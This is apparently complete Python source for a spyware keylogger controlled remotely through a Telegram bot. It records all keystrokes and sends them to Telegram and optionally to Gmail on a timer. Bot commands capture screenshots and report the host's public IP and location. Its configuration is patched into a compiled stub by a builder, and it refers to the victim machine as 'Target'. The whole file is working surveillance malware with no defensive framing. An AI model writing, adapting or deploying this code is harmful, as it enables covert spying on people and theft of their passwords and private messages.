import os
import platform
import socket
import threading
import smtplib
import json
import sys
import time
from email.mime.text import MIMEText
import telebot # pip install pyTelegramBotAPI
from pynput import keyboard # pip install pynput
from PIL import ImageGrab
import urllib.request
import io

# ================= USER CONFIGURATION (HARDCODED) ===================
# ================= USER CONFIGURATION ===================
# ================= USER CONFIGURATION ===================
# ================= CONFIGURATION ===================
CONFIG_DELIMITER = b"#####CONFIG#####"
CONFIG_FILE = "log_config.json"

def load_config():
    """
    Attempts to load config in the following order:
    1. From the EOF (End of File) if attached by Builder.
    2. From local log_config.json (Persistence).
    3. Defaults (Empty).
    """
    config = {
        "bot_token": "",
        "chat_id": "",
        "email_enabled": False,
        "email_user": "",
        "email_pass": "",
        "email_to": ""
    }

    # 1. Try to read from Stub (Binary Patching)
    try:
        if getattr(sys, 'frozen', False):
            # Running as compiled .exe
            executable_path = sys.executable
        else:
            # Running as script (dev mode)
            executable_path = __file__

        with open(executable_path, "rb") as f:
            content = f.read()
            if CONFIG_DELIMITER in content:
                # Split at the LAST occurrence of the delimiter
                raw_config = content.split(CONFIG_DELIMITER)[-1]
                try:
                    patch_data = json.loads(raw_config.decode('utf-8', errors='ignore'))
                    config.update(patch_data)
                except Exception:
                    pass
    except Exception:
        pass

    # 2. Try to load local persistence (overrides stub if needed, or fills chat_id)
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                saved_config = json.load(f)
                # Only update if value exists
                if saved_config.get("chat_id"): config["chat_id"] = saved_config["chat_id"]
                if "email_enabled" in saved_config: config["email_enabled"] = saved_config["email_enabled"]
        except Exception:
            pass
            
    # Auto-Discovery Logic check
    # If we have a token but no chat_id, we need discovery.
    # If we don't have a token, we can't do anything.
    
    if config["bot_token"] and not config["chat_id"]:
        # Silent Discovery Mode
        try:
            temp_bot = telebot.TeleBot(config["bot_token"])
            while True:
                try:
                    updates = temp_bot.get_updates(offset=-1)
                    if updates:
                        chat_id = updates[-1].message.chat.id
                        config["chat_id"] = str(chat_id)
                        
                        # Save ONLY generic persistence info, not the full token if we can avoid it 
                        # (though saving all is easiest for now)
                        save_config(config)
                        
                        try:
                            temp_bot.send_message(chat_id, f"✅ **Connection Established!**\nHostname: `{socket.gethostname()}`", parse_mode="Markdown")
                        except: pass
                        break
                except: pass
                time.sleep(2)
        except: pass

    return config

def save_config(config):
    # We only save specific persistent fields to disk, not necessarily the token if it's in the stub
    # But for simplicity, we dump the current working config
    try:
        with open(CONFIG_FILE, "w") as f:
            json.dump(config, f, indent=4)
    except Exception:
        pass

class KeyloggerBot:
    def __init__(self, config):
        self.interval = 60 # Default
        self.token = config.get("bot_token", "")
        self.chat_id = config.get("chat_id", "")
        
        self.email = config.get("email_user", "")
        self.password = config.get("email_pass", "")
        self.to_email = config.get("email_to", "")
        
        self.log = ""
        self.username = os.getlogin()
        self.hostname = socket.gethostname()
        
        self.is_logging = True
        
        # Check if email explicitly enabled in config (AND has creds)
        self.email_enabled = config.get("email_enabled", False)
        if not (self.email and self.password and self.to_email):
             self.email_enabled = False # Force disable if creds missing

        try:
            if self.token:
                self.bot = telebot.TeleBot(self.token)
                self.setup_bot_handlers()
        except Exception:
            pass

    def update_config(self):
        """Helper to save current state"""
        cfg = {
            "bot_token": self.token,
            "chat_id": self.chat_id,
            "email_enabled": self.email_enabled,
            "email_user": self.email,
            "email_pass": self.password,
            "email_to": self.to_email
        }
        save_config(cfg)

    def get_system_info(self):
        try:
            public_ip = urllib.request.urlopen('https://api.ipify.org').read().decode('utf8')
        except:
            public_ip = "Unknown"
        
        try:
            # Basic location info
            with urllib.request.urlopen("http://ip-api.com/json/") as url:
                data = json.loads(url.read().decode())
                location = f"{data.get('city')}, {data.get('country')}"
        except:
            location = "Unknown"

        info = (
            f"💻 **System Info**\n"
            f"Hostname: `{self.hostname}`\n"
            f"User: `{self.username}`\n"
            f"OS: `{platform.system()} {platform.release()}`\n"
            f"Processor: `{platform.machine()}`\n"
            f"Public IP: `{public_ip}`\n"
            f"Location: `{location}`"
        )
        return info

    def take_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            bio = io.BytesIO()
            screenshot.save(bio, 'PNG')
            bio.seek(0)
            return bio
        except:
            return None

    def setup_bot_handlers(self):
        @self.bot.message_handler(commands=['start'])
        def handle_start(message):
            self.is_logging = True
            self.bot.reply_to(message, "✅ **Logging Started!**")

        @self.bot.message_handler(commands=['stop'])
        def handle_stop(message):
            self.is_logging = False
            self.bot.reply_to(message, "🛑 **Logging Stopped!** (Bot is active)")

        @self.bot.message_handler(commands=['email_on'])
        def handle_email_on(message):
            if not self.email or not self.password:
                self.bot.reply_to(message, "❌ **Error:** Email credentials not configured in payload.")
                return
            
            self.email_enabled = True
            self.update_config() # Persist
            self.bot.reply_to(message, "📧 **Email Logs: ENABLED** (Saved)")

        @self.bot.message_handler(commands=['email_off'])
        def handle_email_off(message):
            self.email_enabled = False
            self.update_config() # Persist
            self.bot.reply_to(message, "📴 **Email Logs: DISABLED** (Saved)")

        @self.bot.message_handler(commands=['screenshot'])
        def handle_screenshot(message):
            self.bot.send_chat_action(message.chat.id, 'upload_photo')
            photo = self.take_screenshot()
            if photo:
                try:
                    self.bot.send_photo(message.chat.id, photo, caption="📸 Screenshot Captured")
                except:
                    self.bot.reply_to(message, "❌ Error sending photo.")
            else:
                self.bot.reply_to(message, "❌ Failed to take screenshot.")

        @self.bot.message_handler(commands=['info'])
        def handle_info(message):
            self.bot.send_chat_action(message.chat.id, 'typing')
            info = self.get_system_info()
            self.bot.reply_to(message, info, parse_mode="Markdown")

        @self.bot.message_handler(commands=['logs'])
        def handle_logs(message):
            if self.log:
                self.send_data(force=True)
            else:
                self.bot.reply_to(message, "📭 Log is empty.")

        @self.bot.message_handler(commands=['help'])
        def handle_help(message):
            status_msg = (
                f"🤖 **Bot Status**\n"
                f"Logging: {'✅ ON' if self.is_logging else '🛑 OFF'}\n"
                f"Email: {'✅ ON' if self.email_enabled else '📴 OFF'}\n\n"
                f"**Commands:**\n"
                f"/start, /stop, /logs, /email_on, /email_off\n"
                f"/screenshot - Capture screen\n"
                f"/info - System details"
            )
            self.bot.reply_to(message, status_msg, parse_mode="Markdown")

    def append_to_log(self, string):
        self.log += string

    def on_press(self, key):
        if not self.is_logging:
            return

        try:
            current_key = str(key).replace("'", "")
        except ImportError:
            pass

        if key == keyboard.Key.space:
            current_key = " "
        elif key == keyboard.Key.enter:
            current_key = "\n"
        elif key == keyboard.Key.esc:
            pass
        elif key == keyboard.Key.backspace:
            current_key = " [BACKSPACE] " 
        elif str(key).find("Key") != -1:
            current_key = f" [{str(key).split('.')[1]}] "

        self.append_to_log(current_key)

    def send_email(self, message):
        if not self.email_enabled or not self.email or not self.password:
            return
            
        try:
            msg = MIMEText(message)
            msg['Subject'] = f"Keylogs - {self.username}@{self.hostname}"
            msg['From'] = self.email
            msg['To'] = self.to_email

            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
                server.login(self.email, self.password)
                server.send_message(msg)
        except Exception as e:
            pass

    def send_data(self, force=False):
        if self.log:
            header = f"🔐 **Keylogs from:** `{self.username}@{self.hostname}`\n\n"
            full_message = header + self.log
            
            # Send to Telegram
            try:
                self.bot.send_message(self.chat_id, full_message, parse_mode="Markdown")
            except Exception:
                pass

            # Send to Email (if enabled)
            if self.email_enabled:
                self.send_email(self.log)

            self.log = "" # Clear after sending

        # Restart timer if not forced
        if not force:
            timer = threading.Timer(self.interval, self.send_data)
            timer.daemon = True
            timer.start()

    def start(self):
        # Notify start
        try:
            status_text = "📧 Email: ON" if self.email_enabled else "📧 Email: OFF"
            self.bot.send_message(self.chat_id, f"🚀 **Keylogger Started!**\nTarget: `{self.username}@{self.hostname}`\n{status_text}", parse_mode="Markdown")
        except Exception:
             pass

        # Start Reporting Timer
        self.send_data()

        # Start Key Listener (Non-blocking)
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()

        # Start Bot Polling (Blocking)
        try:
            self.bot.infinity_polling()
        except Exception:
            pass

if __name__ == "__main__":
    # 1. Load Config (Auto-Silent)
    config = load_config()
    
    # 2. Start Keylogger
    if config.get("bot_token"):
        # We need a token to start, Chat ID can be discovered
        keylogger = KeyloggerBot(config)
        keylogger.start()
